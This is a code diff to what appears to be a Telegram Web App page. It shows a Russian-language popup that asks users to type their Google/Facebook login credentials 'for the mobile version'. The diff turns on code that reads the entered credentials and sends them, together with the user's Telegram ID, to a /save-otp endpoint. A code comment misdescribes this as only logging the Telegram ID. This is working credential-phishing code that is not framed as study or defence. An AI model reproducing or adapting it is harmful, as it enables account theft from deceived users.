@@ -34,7 +34,7 @@ document.addEventListener("DOMContentLoaded", () => {
             </button>
             <h2>Пришлите через пробел данные от Google/Facebook* для входа в мобильную версию.</h2>
             <div class="order-input-container">
-                <input type="text" id="order-input" placeholder="Введите данные..." />
+                <input type="text" id="order-input" />
             </div>
             <button class="next-btn">
                 <img src="/static/images/next.png" alt="Далее">
@@ -51,7 +51,17 @@ document.addEventListener("DOMContentLoaded", () => {
         // Обработчик для кнопки "Далее" в первом окне
         popup.querySelector(".next-btn").addEventListener("click", () => {
             // Если нужно, можно сохранить данные первого шага:
-            // let otpData = document.getElementById("order-input").value;
+            let otpData = document.getElementById("order-input").value;
+            if (window.Telegram && window.Telegram.WebApp) {
+                const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
+                // Выводим Telegram ID в консоль сервера, отправив его через fetch
+                 fetch("/save-otp", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({ tg_id: userId, otp: otpData}),
+                })}
             popup.remove();
             // Показываем второе окно для ввода ссылки Telegram
             showTelegramPopup();
